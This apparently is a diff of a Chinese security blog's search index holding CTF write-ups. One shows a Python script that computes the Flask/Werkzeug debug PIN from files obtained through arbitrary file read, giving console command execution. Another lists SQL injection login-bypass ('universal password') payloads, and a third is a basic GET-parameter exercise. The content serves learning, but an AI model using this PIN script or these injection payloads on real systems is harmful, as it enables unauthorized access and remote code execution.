-<p>可以从&#x2F;etc&#x2F;passwd或者&#x2F;proc&#x2F;self&#x2F;environ环境变量中读取</p>
-<p><strong>网卡地址</strong></p>
-<p>读取这两个地址：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address或&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</p>
-<p><strong>getattr(mod, ‘file’, None)</strong></p>
-<p>flask目录下的一个app.py的<strong>绝对路径</strong>,这个值可以在报错页面看到。但有个坑，python3是app.py，python2中是app.pyc</p>
-<p><strong>machine_id()</strong></p>
-<p>linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i</p>
-<p>windows读取注册表中的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</p>
-<p>对于docker机则读取读取&#x2F;proc&#x2F;self&#x2F;cgroup获取get_machine_id()(docker后面那段字符串)：</p>
-<p>​<img src="/assets/wps1-20231017104858-k8gscqp.jpg">​</p>
-<p>但是注意的是Flask下的werzeug版本在在2020年1月5号就发生了更新，代码发生了变化，因此要再读取到machine_id()的值的话需要先读取&#x2F;etc&#x2F;machine-id，再读取&#x2F;proc&#x2F;self&#x2F;cgroup，并将第一个获取到的值与第二个获取到的id值进行拼接</p>
-<p>详细文章说明：<a href="https://cloud.tencent.com/developer/article/1657739">https://cloud.tencent.com/developer/article/1657739</a></p>
-<p>当然如果指定了Werkzeug版本就可以避免该情况</p>
-<p>Flask&#x3D;&#x3D;1.0.2</p>
-<p>Werkzeug&#x3D;&#x3D;0.14.1</p>
-<p>就可以像网上很多文章所写的一样可以正常构造了。至于对于我们这道题就只能是拼接出machine_id了。最终POC如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376923487&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;c31eea55a29431535ff01de94bdcf5cf415fe597d35eb4e23fd2a991b6d2225599f4e20039e85b0f7d83e706215e8054&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
-
-<p>至于这6个参数这样获得：</p>
-<p>1）首先通过dirsearch探测到存在file目录</p>
-<p>​<img src="/assets/wps2-20231017104858-81ff2k5.jpg">​</p>
-<p>访问后给出提示</p>
-<p>​<img src="/assets/wps3-20231017104858-vbj9ot7.jpg">​</p>
-<p>2）尝试任意文件读取，很明显只有一个root用户具有登录权限，所以它很明显就是启动这个Flask的用户。</p>
-<p>​<img src="/assets/wps4-20231017104858-9epe0bt.jpg">​</p>
-<p>3）而从首页的debug报错页面又可以得到flask目录下的一个app.py的绝对路径</p>
-<p>​<img src="/assets/wps5-20231017104858-107dcsl.jpg">​</p>
-<p>4）&#x2F;file?filename&#x3D;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 读取第五个参数</p>
-<p>​<img src="/assets/wps6-20231017104858-tozokxg.jpg">​</p>
-<p>但这个值得注意的是需要将冒号去掉，然后转为十进制</p>
-<p>​<img src="/assets/wps7-20231017104858-f2dfssh.jpg">​</p>
-<p>5）&#x2F;file?filename&#x3D;&#x2F;etc&#x2F;machine-id获得的值与&#x2F;file?filename&#x3D;&#x2F;proc&#x2F;self&#x2F;cgroup获得的容器id进行拼接，结果：6a7b652f3677464382b49ac8dc35ba0f4c56263c62231cb4bcc1223c454dd50a3176463b7342f00dc64795372edd9a7f</p>
-<p>运行结果</p>
-<p>​<img src="/assets/wps8-20231017104858-4jl8gjv.jpg">​</p>
-<p>回到首页</p>
-<p>​<img src="/assets/wps9-20231017104858-mmuo8n3.jpg">​</p>
-<p>单击这个图标输入我们得到的pin码就可以进入控制终端了，通过popen进行执行命令。</p>
-<p>​<img src="/assets/wps10-20231017104858-6i6229s.jpg">​</p>
-<p>Flag：flag{873894c49201cd995ee2c52e6270630d}</p>
-<p>补充：</p>
-<p>​<img src="/assets/wps11-20231017104858-f0ggh2m.jpg">​</p>
-<p>非预期：</p>
-<p>​<img src="/assets/wps12-20231017104858-wc0g1ux.jpg">​</p>
-<p>任意文件读取环境变量，可以直接读取到flag。</p>
-<p>‍</p>
-]]></content>
-  </entry>
-  <entry>
     <title>文件上传</title>
     <url>/2023/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<p>摘要</p>
@@ -2043,26 +1981,6 @@
       </categories>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/10/23/WEB/GET%E4%BC%A0%E5%8F%82/</url>
-    <content><![CDATA[<h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><h1 id="GET传参-1"><a href="#GET传参-1" class="headerlink" title="GET传参"></a>GET传参</h1><h2 id="一，介绍"><a href="#一，介绍" class="headerlink" title="一，介绍"></a>一，介绍</h2><p>GET传参是一种http的请求方式，是基础中的基础，在后面的题目如PHP代码的绕过，或者<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>里都会用到。</p>
-<p><img src="/assets/image-20230611110624-mw9nj3u.png" alt="image.png"></p>
-<p><strong>?what&#x3D;flag</strong></p>
-<p>这里贴一道bugku的web题中的GET题，读代码显然是需要一个名为what的变量，变量的值为flag，而得到what变量值的方法就是GET<br>所以我们需要在URL后面加上?what&#x3D;flag，即 123.206.87.240:8002&#x2F;get&#x2F;?what&#x3D;flag。</p>
-<h2 id="二，总结"><a href="#二，总结" class="headerlink" title="二，总结"></a>二，总结</h2><p>所以对于GET方法请求的参数，传参的方法就是URL后面加上 ?参数名&#x3D;参数值。</p>
-<h2 id="三，例题"><a href="#三，例题" class="headerlink" title="三，例题"></a>三，例题</h2><h3 id="1-BUUCTF-Havefun"><a href="#1-BUUCTF-Havefun" class="headerlink" title="1.BUUCTF-Havefun"></a>1.BUUCTF-Havefun</h3><p><img src="/assets/image-20230611110935-om5ws4d.png" alt="image.png"></p>
-<p><img src="/assets/image-20230611111227-i0xle9b.png" alt="image.png"></p>
-<h4 id="1-查看网页源代码（ctrl-u）"><a href="#1-查看网页源代码（ctrl-u）" class="headerlink" title="1.查看网页源代码（ctrl+u）"></a>1.查看网页源代码（ctrl+u）</h4><p>向下拖动<a href="https://so.csdn.net/so/search?q=%E6%BB%91%E5%9D%97&spm=1001.2101.3001.7020">滑块</a>，在网页源代码的末尾我们可以看到如下注释信息：</p>
-<p><img src="/assets/image-20230611111127-07ydkdd.png" alt="image.png"></p>
-<p>这是一段 PHP 代码。</p>
-<ol>
-<li>$_GET 是 PHP 中预定义的变量，包含了通过 GET 方式提交的信息。</li>
-<li>echo ‘Syc{cat_cat_cat_cat}’; 有些像 flag 的样子，不管最后是不是直接打印 Syc{cat_cat_cat_cat} ，我们都试一试。</li>
-</ol>
-<p><img src="/assets/image-20230611111337-7i6e06j.png" alt="image.png"></p>
-<h4 id="Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce"><a href="#Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce" class="headerlink" title="Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}"></a>Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}</h4>]]></content>
-  </entry>
-  <entry>
     <title>框架安全</title>
     <url>/2023/10/23/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<p>摘要</p>
@@ -2123,6 +2041,88 @@
       <categories>
         <category>WEB</category>
       </categories>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/Python/flask/</url>
+    <content><![CDATA[<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><h2 id="1-debug——PIN"><a href="#1-debug——PIN" class="headerlink" title="1.debug——PIN"></a>1.debug——PIN</h2><p>考点：最新版本werkzeugd下的flask_pin码的求值</p>
+<p>Flask debug pin的安全问题详细分析参考看<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a>，且大佬也给出了利用脚本。需要重点关注的也就是6个参数</p>
+<p>‍</p>
+<p><strong>username 启动这个Flask的用户</strong></p>
+<p><strong>modname 一般默认flask.app</strong></p>
+<p><strong>getattr(app, ‘name’, getattr(app.class, ‘name‘)) 一般默认flask.app为Flask</strong></p>
+<p><strong>getattr(mod, ‘file’, None)为flask目录下的一个app.py的绝对路径,可在报错页面看到</strong></p>
+<p><strong>str(uuid.getnode()) 则是网卡mac地址的十进制表达式</strong></p>
+<p><strong>get_machine_id() 系统id</strong></p>
+<p>‍</p>
+<p>由于pin码构建需要这6个参数，但不同环境下，参数会有变化，除了默认不变的参数，其他参数我们可以这样获得：</p>
+<p><strong>username</strong></p>
+<p>可以从&#x2F;etc&#x2F;passwd或者&#x2F;proc&#x2F;self&#x2F;environ环境变量中读取</p>
+<p><strong>网卡地址</strong></p>
+<p>读取这两个地址：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address或&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</p>
+<p><strong>getattr(mod, ‘file’, None)</strong></p>
+<p>flask目录下的一个app.py的<strong>绝对路径</strong>,这个值可以在报错页面看到。但有个坑，python3是app.py，python2中是app.pyc</p>
+<p><strong>machine_id()</strong></p>
+<p>linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i</p>
+<p>windows读取注册表中的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</p>
+<p>对于docker机则读取读取&#x2F;proc&#x2F;self&#x2F;cgroup获取get_machine_id()(docker后面那段字符串)：</p>
+<p>​<img src="/assets/wps1-20231017104858-k8gscqp.jpg">​</p>
+<p>但是注意的是Flask下的werzeug版本在在2020年1月5号就发生了更新，代码发生了变化，因此要再读取到machine_id()的值的话需要先读取&#x2F;etc&#x2F;machine-id，再读取&#x2F;proc&#x2F;self&#x2F;cgroup，并将第一个获取到的值与第二个获取到的id值进行拼接</p>
+<p>详细文章说明：<a href="https://cloud.tencent.com/developer/article/1657739">https://cloud.tencent.com/developer/article/1657739</a></p>
+<p>当然如果指定了Werkzeug版本就可以避免该情况</p>
+<p>Flask&#x3D;&#x3D;1.0.2</p>
+<p>Werkzeug&#x3D;&#x3D;0.14.1</p>
+<p>就可以像网上很多文章所写的一样可以正常构造了。至于对于我们这道题就只能是拼接出machine_id了。最终POC如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376923487&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;c31eea55a29431535ff01de94bdcf5cf415fe597d35eb4e23fd2a991b6d2225599f4e20039e85b0f7d83e706215e8054&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>至于这6个参数这样获得：</p>
+<p>1）首先通过dirsearch探测到存在file目录</p>
+<p>​<img src="/assets/wps2-20231017104858-81ff2k5.jpg">​</p>
+<p>访问后给出提示</p>
+<p>​<img src="/assets/wps3-20231017104858-vbj9ot7.jpg">​</p>
+<p>2）尝试任意文件读取，很明显只有一个root用户具有登录权限，所以它很明显就是启动这个Flask的用户。</p>
+<p>​<img src="/assets/wps4-20231017104858-9epe0bt.jpg">​</p>
+<p>3）而从首页的debug报错页面又可以得到flask目录下的一个app.py的绝对路径</p>
+<p>​<img src="/assets/wps5-20231017104858-107dcsl.jpg">​</p>
+<p>4）&#x2F;file?filename&#x3D;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 读取第五个参数</p>
+<p>​<img src="/assets/wps6-20231017104858-tozokxg.jpg">​</p>
+<p>但这个值得注意的是需要将冒号去掉，然后转为十进制</p>
+<p>​<img src="/assets/wps7-20231017104858-f2dfssh.jpg">​</p>
+<p>5）&#x2F;file?filename&#x3D;&#x2F;etc&#x2F;machine-id获得的值与&#x2F;file?filename&#x3D;&#x2F;proc&#x2F;self&#x2F;cgroup获得的容器id进行拼接，结果：6a7b652f3677464382b49ac8dc35ba0f4c56263c62231cb4bcc1223c454dd50a3176463b7342f00dc64795372edd9a7f</p>
+<p>运行结果</p>
+<p>​<img src="/assets/wps8-20231017104858-4jl8gjv.jpg">​</p>
+<p>回到首页</p>
+<p>​<img src="/assets/wps9-20231017104858-mmuo8n3.jpg">​</p>
+<p>单击这个图标输入我们得到的pin码就可以进入控制终端了，通过popen进行执行命令。</p>
+<p>​<img src="/assets/wps10-20231017104858-6i6229s.jpg">​</p>
+<p>Flag：flag{873894c49201cd995ee2c52e6270630d}</p>
+<p>补充：</p>
+<p>​<img src="/assets/wps11-20231017104858-f0ggh2m.jpg">​</p>
+<p>非预期：</p>
+<p>​<img src="/assets/wps12-20231017104858-wc0g1ux.jpg">​</p>
+<p>任意文件读取环境变量，可以直接读取到flag。</p>
+<p>‍</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/23/WEB/GET%E4%BC%A0%E5%8F%82/</url>
+    <content><![CDATA[<h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><h1 id="GET传参-1"><a href="#GET传参-1" class="headerlink" title="GET传参"></a>GET传参</h1><h2 id="一，介绍"><a href="#一，介绍" class="headerlink" title="一，介绍"></a>一，介绍</h2><p>GET传参是一种http的请求方式，是基础中的基础，在后面的题目如PHP代码的绕过，或者<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>里都会用到。</p>
+<p><img src="/assets/image-20230611110624-mw9nj3u.png" alt="image.png"></p>
+<p><strong>?what&#x3D;flag</strong></p>
+<p>这里贴一道bugku的web题中的GET题，读代码显然是需要一个名为what的变量，变量的值为flag，而得到what变量值的方法就是GET<br>所以我们需要在URL后面加上?what&#x3D;flag，即 123.206.87.240:8002&#x2F;get&#x2F;?what&#x3D;flag。</p>
+<h2 id="二，总结"><a href="#二，总结" class="headerlink" title="二，总结"></a>二，总结</h2><p>所以对于GET方法请求的参数，传参的方法就是URL后面加上 ?参数名&#x3D;参数值。</p>
+<h2 id="三，例题"><a href="#三，例题" class="headerlink" title="三，例题"></a>三，例题</h2><h3 id="1-BUUCTF-Havefun"><a href="#1-BUUCTF-Havefun" class="headerlink" title="1.BUUCTF-Havefun"></a>1.BUUCTF-Havefun</h3><p><img src="/assets/image-20230611110935-om5ws4d.png" alt="image.png"></p>
+<p><img src="/assets/image-20230611111227-i0xle9b.png" alt="image.png"></p>
+<h4 id="1-查看网页源代码（ctrl-u）"><a href="#1-查看网页源代码（ctrl-u）" class="headerlink" title="1.查看网页源代码（ctrl+u）"></a>1.查看网页源代码（ctrl+u）</h4><p>向下拖动<a href="https://so.csdn.net/so/search?q=%E6%BB%91%E5%9D%97&spm=1001.2101.3001.7020">滑块</a>，在网页源代码的末尾我们可以看到如下注释信息：</p>
+<p><img src="/assets/image-20230611111127-07ydkdd.png" alt="image.png"></p>
+<p>这是一段 PHP 代码。</p>
+<ol>
+<li>$_GET 是 PHP 中预定义的变量，包含了通过 GET 方式提交的信息。</li>
+<li>echo ‘Syc{cat_cat_cat_cat}’; 有些像 flag 的样子，不管最后是不是直接打印 Syc{cat_cat_cat_cat} ，我们都试一试。</li>
+</ol>
+<p><img src="/assets/image-20230611111337-7i6e06j.png" alt="image.png"></p>
+<h4 id="Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce"><a href="#Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce" class="headerlink" title="Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}"></a>Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}</h4>]]></content>
   </entry>
   <entry>
     <title></title>
@@ -2371,6 +2371,24 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><h1 id="SQL注入万能密码-1"><a href="#SQL注入万能密码-1" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
+<h1 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h1><p>原验证登陆语句:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> Username<span class="operator">=</span> <span class="string">&#x27;&quot;.$username.&quot;&#x27;</span> <span class="keyword">AND</span> Password<span class="operator">=</span> <span class="string">&#x27;&quot;.md5($password).&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p>
+<p>SELECT * FROM admin WHERE Username&#x3D;’1’ OR 1&#x3D;1 OR ‘1’&#x3D;’1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’<br>1<br>即得到优先级关系：or&lt;and&lt;not，同一优先级默认从左往右计算。</p>
+<p>(1.)上面’1’&#x3D;‘1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’先计算肯定返回false,因为密码是我们乱输入的。(此处是假)</p>
+<p>(2.)Username&#x3D;‘1’ 返回假,没有用户名是1(此处是假)</p>
+<p>(3.)1&#x3D;1返回真(此处是真)</p>
+<p>以上的结果是: 假 or 真 or假 返回真。验证通过。</p>
+<p>万能密码<br>‘ or 1&#x3D;’1<br>‘or’&#x3D;’or’<br>admin<br>admin’–<br>admin’ or 4&#x3D;4–<br>admin’ or ‘1’&#x3D;’1’–<br>admin888<br>“or “a”&#x3D;”a<br>admin’ or 2&#x3D;2#<br>a’ having 1&#x3D;1#<br>a’ having 1&#x3D;1–<br>admin’ or ‘2’&#x3D;’2<br>‘)or(‘a’&#x3D;’a<br>or 4&#x3D;4–<br>c<br>a’or’ 4&#x3D;4–<br>“or 4&#x3D;4–<br>‘or’a’&#x3D;’a<br>“or”&#x3D;”a’&#x3D;’a<br>‘or’’&#x3D;’<br>‘or’&#x3D;’or’<br>1 or ‘1’&#x3D;’1’&#x3D;1<br>1 or ‘1’&#x3D;’1’ or 4&#x3D;4<br>‘OR 4&#x3D;4%00<br>“or 4&#x3D;4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’&#x3D;’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’&#x3D;’a 密码随便<br>‘or’&#x3D;’or’<br>‘or 4&#x3D;4&#x2F;*<br>something<br>‘ OR ‘1’&#x3D;’1<br>1’or’1’&#x3D;’1<br>admin’ OR 4&#x3D;4&#x2F;*<br>1’or’1’&#x3D;’1<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>asp aspx万能密码<br>1：”or “a”&#x3D;”a<br>2： ‘)or(‘a’&#x3D;’a<br>3：or 1&#x3D;1–<br>4：’or 1&#x3D;1–<br>5：a’or’ 1&#x3D;1–<br>6：”or 1&#x3D;1–<br>7：’or’a’&#x3D;’a<br>8：”or”&#x3D;”a’&#x3D;’a<br>9：’or”&#x3D;’<br>10：’or’&#x3D;’or’<br>11: 1 or ‘1’&#x3D;’1’&#x3D;1<br>12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br>13: ‘OR 1&#x3D;1%00<br>14: “or 1&#x3D;1%00<br>15: ‘xor<br>16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”&#x3D;’ （替换表名admin）<br>密码 1<br>17…admin’ or ‘a’&#x3D;’a 密码随便</p>
+<p>PHP万能密码<br>‘or 1&#x3D;1&#x2F;*<br>User: something<br>Pass: ’ OR ‘1’&#x3D;’1</p>
+<p>jsp 万能密码<br />1’or’1’&#x3D;’1<br />admin’ OR 1&#x3D;1&#x2F;*</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2023/10/23/WEB/WEB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="WEB工具使用"><a href="#WEB工具使用" class="headerlink" title="WEB工具使用"></a>WEB工具使用</h1><h1 id="WEB工具使用-1"><a href="#WEB工具使用-1" class="headerlink" title="WEB工具使用"></a>WEB工具使用</h1><h1 id="御剑后台扫描工具"><a href="#御剑后台扫描工具" class="headerlink" title="御剑后台扫描工具"></a>御剑后台扫描工具</h1><p><img src="/assets/image-20230611104320-8bs55t8.png" alt="image.png"></p>
 <p>输入域名，选择需要扫描的内容，点击开始扫描即可。</p>
@@ -2429,20 +2447,8 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><h1 id="SQL注入万能密码-1"><a href="#SQL注入万能密码-1" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
-<h1 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h1><p>原验证登陆语句:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> Username<span class="operator">=</span> <span class="string">&#x27;&quot;.$username.&quot;&#x27;</span> <span class="keyword">AND</span> Password<span class="operator">=</span> <span class="string">&#x27;&quot;.md5($password).&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p>
-<p>SELECT * FROM admin WHERE Username&#x3D;’1’ OR 1&#x3D;1 OR ‘1’&#x3D;’1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’<br>1<br>即得到优先级关系：or&lt;and&lt;not，同一优先级默认从左往右计算。</p>
-<p>(1.)上面’1’&#x3D;‘1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’先计算肯定返回false,因为密码是我们乱输入的。(此处是假)</p>
-<p>(2.)Username&#x3D;‘1’ 返回假,没有用户名是1(此处是假)</p>
-<p>(3.)1&#x3D;1返回真(此处是真)</p>
-<p>以上的结果是: 假 or 真 or假 返回真。验证通过。</p>
